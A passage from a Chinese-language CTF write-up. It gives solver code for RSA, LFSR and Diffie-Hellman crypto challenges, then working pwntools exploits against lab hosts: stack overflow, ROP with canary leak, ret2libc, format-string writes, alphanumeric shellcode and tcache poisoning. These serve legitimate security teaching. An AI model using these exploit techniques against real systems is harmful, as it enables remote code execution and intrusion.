c2 = 11293777290569693972360166961981727494638218221438571150393361751316389824613571820229370915191500766619410597117671232443452691634734112652285521806824284959073558010661204730954928847260946403867297932862687770449632506087883187920107766050673462588812979708792790888354008526054467620780053118019643408427959406056087370960170992834047890080269663747877143270683069575318397144844481262382463469080755423097527007161449411933936669451476467352049264455203632729909164666006688294056405955940041007137719228484035343153943155100892867641033645111253109951972003798413524003505574000784399458705347262353155363413513341797868942085136977548116650815336000627353933708913237438841909324920070013498153627767891674969586034872104569344923832761239959420543717354211689339868787331074579605476477152218068810732089913023456240425720821047030224659918
e2 = 138906518221471521524404330039616633297752765534176570868900039237133419857485415639423196636068397237296224442083213768630488100717977884415342104239280950424735129147986053115335928783190377695248250926374734988108972136349625965753649992146322810352768246041575396721661142246729747572832017510241749082619


def continuedFra(x, y):
    cF = []
    while y:
        cF += [x // y]
        x, y = y, x % y
    return cF


def Simplify(ctnf):
    numerator = 1
    denominator = 0
    for x in ctnf[::-1]:
        numerator, denominator = x * numerator + denominator, numerator
    return (numerator, denominator)


def getit(c):
    cf = []
    for i in range(1, len(c)):
        cf.append(Simplify(c[:i]))
    return cf


def wienerAttack(e, n):
    cf = continuedFra(e, n)
    for (Q1, Q2) in getit(cf):
        if Q1 == 0:
            continue
        if n1 % Q1 == 0 and Q1 != 1:
            return (Q1, Q2)
    print('Not Found')


Q1, Q2 = wienerAttack(n1, n2)

P1 = gmpy2.iroot(n1//Q1, 2)[0]
P2 = gmpy2.next_prime(P1)

phi1 = P1*(P1-1)*(Q1-1)
phi2 = P2*(P2-1)*(Q2-1)
d1 = gmpy2.invert(e1, phi1)
d2 = gmpy2.invert(e2, phi2)
m1 = long_to_bytes(gmpy2.powmod(c1, d1, n1))
m2 = long_to_bytes(gmpy2.powmod(c2, d2, n2))
print((m1+m2))

# b'vmc{Y0u_Ar3_real11ly_sm4rt_in_rrssaa}
```

---

## LFSR分析

本题考察的是对线性反馈移位寄存器（LFSR）的分析和破解。题目给出了 LFSR 的输出序列，我们需要根据这个输出序列来推导出 LFSR 的反馈函数和初始状态，从而还原出完整的 flag。首先，我们可以根据输出序列构建一个线性方程组，其中未知数是 LFSR 的反馈系数。利用 SageMath 中的 solve_right 函数，我们可以求解这个线性方程组，得到反馈系数。然后，我们可以根据这些反馈系数构建一个递推矩阵 m。题目中指出 flag 先进行了 2024 轮递推，然后才开始输出。因此，我们可以利用递推矩阵 m 的 2024 次幂和已知的输出序列，反推出 flag 的初始状态。最后，我们将 flag 的初始状态转换为字节串的形式，即可得到 flag。

```python
ct = '10000100001110000110010001010111011110010100101011100100100001111010011001010101100101010011101010000011010011001100111110000100101011011101001111100010101001111011111111001010110111010000110011110010101001000111111000011110101010100010101111010111010001101100110111110001101000100100011000010010100011010111110101100100111010101011011100111001001110010101110011101010110011101101010010010101111110100011011111110001110000001000111111000011101010001100110000001010001000010001010001101010110100101001011111100101100001000010000011000110011110110111011111000101100100111101111011000000010111100010010010100101011110110010001100101111001101100000100010011101110000100111010100110111110110001100001000100001011010010111100011001110001011011110001101010110111000101110110110101101110101100010111010001000'
n = 400

c = list(map(int, list(ct)))
l = matrix(GF(2), [c[i:i+n] for i in range(n)])
r = matrix(GF(2), [c[i+n:i+n+1] for i in range(n)])
k = l.solve_right(r)

m = matrix(GF(2),n)
for i in range(n-1):
    m[i+1,i]=1
for i in range(n):
    m[i,-1]=k[i][0]
    
v = (m^2024).solve_left(matrix(GF(2), c[:n]))
sv = ''.join([str(i) for i in v[0]])
''.join([chr(int(sv[i:i+8],2)) for i in range(0,len(sv),8)])

# vmc{Brut!e_@r_so1^e_A_sy3teM_0f_eq&&aT10n3??}
```

---

## DH密钥交换算法

本题考察的是迪菲-赫尔曼（DH）密钥交换算法的安全性分析，特别是针对参数选取的安全性。题目要求我们构造一个至少 1024 位的素数 p，使得 p-1 的质因数仅包含 2、3 和 5。这样的 p 可以方便地使用 Pohlig-Hellman 算法来求解离散对数问题。具体步骤是，首先生成一个满足条件的素数 p，然后与服务器进行 DH 密钥交换。服务器会返回公钥 A、B 和密文 m。我们需要利用 Pohlig-Hellman 算法计算出服务器的私钥 a，即求解离散对数 A = 7^a mod p。得到私钥 a 后，我们可以计算出会话密钥 superkey = B^a mod p。最后，利用会话密钥 superkey 和密文 m 计算出 flag，即 flag = m * invert(superkey, p) % p。

### generation of p:

```python
from Crypto.Util.number import isPrime
import random

def generate_prime_with_factors_of_2_3_5(bits=1024):
    count = 0
    while True:
        count += 1
        print(f'[{count}]', end='\r')
        # 随机选择a, b, c的值来生成p-1，使得p有足够的位数
        a = random.randint(100, 1000)  # 控制2的指数
        b = random.randint(100, 700)   # 控制3的指数
        c = random.randint(100, 500)   # 控制5的指数
        p_minus_1 = (2 ** a) * (3 ** b) * (5**c)
        p = p_minus_1 + 1
        if p.bit_length() >= bits and isPrime(p):
            print(f"tried {count} times")
            return p, a, b, c

# 生成一个至少1024位的素数p，满足p-1的质因数仅为2, 3, 5
p, a, b, c = generate_prime_with_factors_of_2_3_5()
print(f"p = {p}")
print(f"p-1 = 2^{a} * 3^{b} * 5^{c}")
print(f"p.bit_length() = {p.bit_length()}")
```

### got A, B, m:

```python
import socket
from Crypto.Util.number import *
import gmpy2

# 这里设置你申请的环境的IP和端口号
HOST = '10.12.153.8'
PORT = 10615

p = 1255652507375424180771153661593175450240095099309617997830398479481251473806248999027009487987474628937865240529484483880639448709701174539063275550960844784506422070337433308527616053480228338110351562500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    msg = s.recv(1024).decode()
    s.send((str(p)+'\n').encode())
    msg = s.recv(1024).decode()
    A = gmpy2.mpz(msg.split(": ")[1].strip())
    msg = s.recv(1024).decode()
    B = gmpy2.mpz(msg.split("Bob公钥: ")[1].split("\n")[0].strip())
    m = gmpy2.mpz(msg.split("密文: ")[1].strip())
    print(f"A = {A}")
    print(f"B = {B}")
    print(f"m = {m}")
    print(f"p = {p}")
```

### computation of flag (SageMath):

```python
from Crypto.Util.number import long_to_bytes
from gmpy2 import invert

A = 355669952921034267831168541396567338166363947361450219963530670142687154164278499711963689789931667207960303928644101973338721608009019378529002236001354163677946386844933203453073205489158777257835345405122620355189693067109336813677425279853274540753847346090117570519936576319829093516256630287227380835834438884042941842672591004254247265449059753546783624217188034293412170221475955127046619991959632722679225589581470575106694
B = 4992551235074421871387972107968363771487136233276180239286246353689116359919410725041440739723408220491150036255059188021684456127922797856578063653007508543762038252915287314177885710762029828656129272330513550260038681775995929558879880649055420782855871380114208676073334623012899162425011870026150202171063960907783143952078876819868496068228454956523392683249724797267889518106109240459463770234197103729380352444944674569942
m = 529905113648101891970936246144584619026712228170489544108250303351975726498967447469928715993635197350465528008213412604954544642112322932091016935939664407327069321404497425823323811343729108388418224967949337788356272012533097878402642053780546701312232145530937593063913656091383846555658677949338255392032614254214581291911487366810137132348740515477804813556580096985377993909891228820887237253011458755426767833584560979924277
p = 1255652507375424180771153661593175450240095099309617997830398479481251473806248999027009487987474628937865240529484483880639448709701174539063275550960844784506422070337433308527616053480228338110351562500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001

R = GF(p)
a = R(A).log(7)

superkey = pow(B, a, p)
flag = m*invert(superkey, p) % p
print(long_to_bytes(flag))
```

---

# Pwn

## 栈溢出

本题是一个非常基础的栈溢出题目。程序存在一个栈溢出漏洞，允许我们输入的字符串长度超过了变量 v3 申请的栈空间大小，从而可以覆盖函数栈帧中的其他数据，包括返回地址。我们的目标是通过覆盖返回地址，将程序执行流程引导到我们想要执行的代码位置。解题过程很简单，我们只需要构造一个足够长的字符串，其中包含我们想要跳转到的地址，并用它来覆盖 v3 的缓冲区即可。通过精心构造的输入，我们可以让程序跳转到指定的地址，从而执行我们想要执行的代码，最终获取 flag。

```python
from pwn import *

host = '10.12.153.73'
port = 10652
p = remote(host, port)

p.sendlineafter(b"Enter your name:", b"111")
payload = b'~' * 248 + p64(20150972)
p.sendlineafter(b"Enter your comment:", payload)
p.interactive()
```

---

## ret2syscall

本题需要我们构造 ROP 链来实现 return to syscall，从而执行系统调用 execve("/bin/sh", NULL, NULL) 来获取 shell。首先，我们需要确定 execve 系统调用的调用号以及参数。在 x86-64 架构下，execve 的系统调用号是 59，第一个参数 rdi 指向 /bin/sh 字符串，第二个参数 rsi 和第三个参数 rdx 设置为 0。接下来，我们需要在程序中找到合适的 ROP gadgets 来设置这些寄存器的值。例如，我们可以找到 pop rax; ret gadget 来设置 rax 为 59，pop rdi; ret gadget 来设置 rdi 为 /bin/sh 的地址，以及 pop rsi; pop rdx; ret gadget 来设置 rsi 和 rdx 为 0。最后，我们需要找到 syscall 指令的地址，并将其放在 ROP 链的末尾。通过精心构造的 ROP 链，我们可以将这些 gadgets 串联起来，最终执行 syscall 指令，完成 execve 系统调用，获得 shell，进而读取 flag。

```python
from pwn import *

host = '10.12.153.73'
port = 10662
p = remote(host, port)

pop_rax = 0x40117e
pop_rdi = 0x401180
pop_rsi_rdx = 0x401182
syscall = 0x401185
sh_addr = 0x404040

payload = b'~'*72
payload += p64(pop_rdi) + p64(sh_addr)
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rsi_rdx) + p64(0) + p64(0)
payload += p64(syscall)
p.sendlineafter(b"Can you make a syscall?\n", payload)
p.interactive()
```

---

## 简单rop

本题需要我们绕过栈保护机制 (Stack Canary) 来进行 ROP 攻击。程序使用了 read 函数进行两次输入，第一次输入用于泄露栈保护值，第二次输入用于构造 ROP 链。由于栈保护值 (canary) 的末尾字节是 \x00，而 char s[40] 数组的最后一个字节后面紧接着就是 canary 的第一个字节，因此我们可以通过输入 41 个字符来覆盖 s 数组，并利用 printf 函数打印 s 数组的内容，从而泄露 canary 的值。在第二次输入时，我们可以在 ROP 链中填入泄露的 canary 值，从而绕过栈保护检查。接下来，我们可以利用 ROP gadgets 设置 rdi 寄存器的值为 /bin/sh 字符串的地址，并调用 system 函数来执行 /bin/sh，最终获取 shell 并读取 flag。

```python
from pwn import *

host = '10.12.153.73'
port = 10692
p = remote(host, port)

pop_rdi = 0x4011DE
sh_addr = 0x404058
call_sys = 0x40127E

payload = cyclic(40)
p.sendlineafter(b'Rush B!!!\n', payload)
p.recvuntil(b"\n")
canary = u64(p.recv()[:7].rjust(8, b'\0'))

payload = cyclic(40)
payload += p64(canary)
payload += cyclic(8)
payload += p64(pop_rdi)
payload += p64(sh_addr)
payload += p64(call_sys)
p.sendline(payload)
p.interactive()
```

---

## 整数溢出

本题利用整数溢出触发 SIGFPE 信号，进而执行 backdoor 函数，最终通过栈溢出漏洞获得 shell。程序中存在一个后门函数 backdoor，但正常情况下无法直接调用。程序通过 signal 机制设置了 SIGFPE 信号的处理函数为 backdoor。当程序发生整数溢出时，会触发 SIGFPE 信号，从而跳转到 backdoor 函数执行。我们可以通过构造一个特殊的输入，例如在 32 位系统中计算 -2147483648 / -1，来触发整数溢出。backdoor 函数中存在一个栈溢出漏洞，我们可以利用这个漏洞来控制程序的返回地址，将其指向 system 函数，并将 /bin/sh 字符串的地址作为参数传递给 system 函数，从而执行 system("/bin/sh") 获得 shell，最终读取 flag。

```python
from pwn import *

host = '10.12.153.73'
port = 10413
p = remote(host, port)

p.sendlineafter(b"first key :", b'-2147483648')
p.sendlineafter(b"second key :", b'-1')
payload = cyclic(88) + p64(0x4007CB)
p.sendlineafter(b"your name :", payload)
p.interactive()
```

---

## ret2libc

本题需要利用 ret2libc 技术来获取 shell。程序没有直接给出 system 函数和 /bin/sh 字符串的地址，但我们可以利用程序中已有的 puts 函数和 GOT 表来泄露 libc 的基地址。首先，我们通过栈溢出漏洞构造 ROP 链，调用 puts 函数打印 puts 函数在 GOT 表中的实际地址。然后，我们根据 puts 函数的实际地址和 libc 库文件中 puts 函数的偏移量，计算出 libc 的基地址。接下来，我们可以根据 libc 的基地址和 libc 库文件中 system 函数和 /bin/sh 字符串的偏移量，计算出 system 函数和 /bin/sh 字符串的实际地址。最后，我们再次利用栈溢出漏洞，构造 ROP 链，调用 system 函数，并将 /bin/sh 字符串的地址作为参数传递给 system 函数，从而执行 system("/bin/sh") 获得 shell，进而读取 flag。调用 system 函数时需要进行栈对齐，因此我们需要在 ROP 链中添加一个 ret 指令的地址来进行栈对齐。

```python
from pwn import *

host = '10.12.153.73'
port = 10696
p = remote(host, port)

e = ELF("./37")
pop_rdi = 0x40117E
puts_got = e.got["puts"]
puts_plt = e.plt["puts"]
vuln_addr = e.symbols["vuln"]

payload = cyclic(72)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(vuln_addr)
p.sendlineafter(b'Go Go Go!!!\n', payload)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

libc = ELF("./libc.so.6")
libc_base = puts_addr - libc.sym["puts"]
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

ret = 0x4011CC
payload = cyclic(72)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
p.sendline(payload)
p.interactive()
```

---

## 格式化字符串

本题利用格式化字符串漏洞来读取和修改内存数据，最终实现任意代码执行。程序中存在一个格式化字符串漏洞，我们可以利用 %p 来泄露栈上的数据，利用 %n 来向指定的内存地址写入数据。我们的目标是将 game 函数的返回地址修改为 success 函数的地址，从而在 game 函数返回时执行 success 函数，输出 flag。首先，我们需要通过 %p 来泄露栈上的数据，找到 game 函数返回地址在栈上的位置，并计算出它相对于格式化字符串的偏移量。然后，我们需要将 success 函数的地址写入到 game 函数的返回地址处。由于 success 函数的地址是一个较大的数，我们需要将其拆分成多个字节，并利用 %hhn 逐字节地修改返回地址。通过精心构造的格式化字符串，我们可以将返回地址修改为 success 函数的地址，最终执行 success 函数，输出 flag。

```python
from pwn import *

host = '10.12.153.73'
port = 10099
p = remote(host, port)

p.sendline(b'3')
payload = b"%p"
p.sendlineafter(b"Input what you want to talk: \n", payload)
p.recv()
res = p.recv().split(b'\n')
input_addr = int(res[1], 16)

game_ret = input_addr+0x40

p.sendline(b'3')
payload = b"%23c%10$hhn~"+p32(game_ret)
p.sendlineafter(b"Input what you want to talk: \n", payload)
p.recv()
p.recv()

p.sendline(b'3')
payload = b"%147c%10$hhn"+p32(game_ret+1)
p.sendlineafter(b"Input what you want to talk: \n", payload)
p.recv()
p.recv()

p.sendline(b'4')
p.recv()
flag = p.recv().decode()
print(flag)
```

---

## shellcode

本题需要我们编写并执行可见字符 shellcode。可见字符 shellcode 是一种特殊的 shellcode，它只包含可打印的 ASCII 字符。我们需要使用工具将普通的 shellcode 转换为可见字符 shellcode，然后将其注入到程序中执行。首先，我们需要下载并安装一个名为 alpha3 的工具，它可以将 shellcode 转换为可见字符 shellcode。然后，我们可以使用 alpha3 工具将 shellcode 转换为可见字符形式。接下来，我们将可见字符 shellcode 作为 payload 注入到程序中。程序会将 payload 存储在栈上，并跳转到 payload 的起始地址执行。由于 payload 是可见字符 shellcode，因此它可以绕过一些输入限制，并成功执行，最终执行 cat /flag 获取 flag。

```python
from pwn import *

host = '10.12.153.73'
port = 10105
p = remote(host, port)

payload = b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

p.sendlineafter(b">", payload)
p.interactive()
```

---

## 堆溢出

本题需要利用堆溢出漏洞来泄露 libc 地址并执行 shellcode。程序使用 malloc 和 free 函数进行堆内存管理，存在堆溢出漏洞。我们的目标是利用堆溢出漏洞泄露 libc 的基地址，并将 __malloc_hook 函数指针修改为 shellcode 的地址，从而在下次调用 malloc 时执行 shellcode。首先，我们申请一个较大的堆块（大于 0x408），并将其释放，使其进入 unsorted bin。此时，该堆块的 fd 指针会指向 main_arena+96 的位置。我们可以通过打印该堆块的内容来泄露 main_arena 的地址。然后，我们根据 main_arena 的地址计算出 __malloc_hook 的地址和 libc 的基地址。接下来，我们利用 tcache poisoning 技术修改 __malloc_hook 指针。我们首先释放一个较小的堆块（例如 0x20），并修改其 fd 指针，使其指向 __malloc_hook。然后，我们申请两次堆块，第一次申请会返回我们伪造的堆块地址，第二次申请会返回 __malloc_hook 的地址。此时，我们可以向 __malloc_hook 写入 shellcode 的地址。最后，我们再次调用 malloc 函数，程序会跳转到 __malloc_hook 指向的地址，即 shellcode 的地址，从而执行 shellcode，获得 shell。

```python
from pwn import *

host = '10.12.153.73'
port = 10647
p = remote(host, port)

libc = ELF('./libc-2.27.so')


def add(i, size):
    p.sendlineafter(b"Your choice >> ", b'1')
    p.sendlineafter(b"index: ", str(i).encode())
    p.sendlineafter(b"size: ", str(size).encode())


def free(i):
    p.sendlineafter(b"Your choice >> ", b'2')
    p.sendlineafter(b"index: ", str(i).encode())


def show(i):
    p.sendlineafter(b"Your choice >> ", b'3')
    p.sendlineafter(b"index: ", str(i).encode())


def edit(i, content):
    p.sendlineafter(b"Your choice >> ", b'4')
    p.sendlineafter(b"index: ", str(i).encode())
    p.sendlineafter(b"content: ", content)


add(0, 0x410)
add(1, 0x20)
free(0)
show(0)
main_arena = u64(p.recv()[9:-1].ljust(8, b'\x00')) - 96
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
shell = libc_base + 0x10A2FC
free(1)
edit(1, p64(malloc_hook))
add(2, 0x20)
add(3, 0x20)
edit(3, p64(shell))
add(4, 0x10)
p.interactive()
```
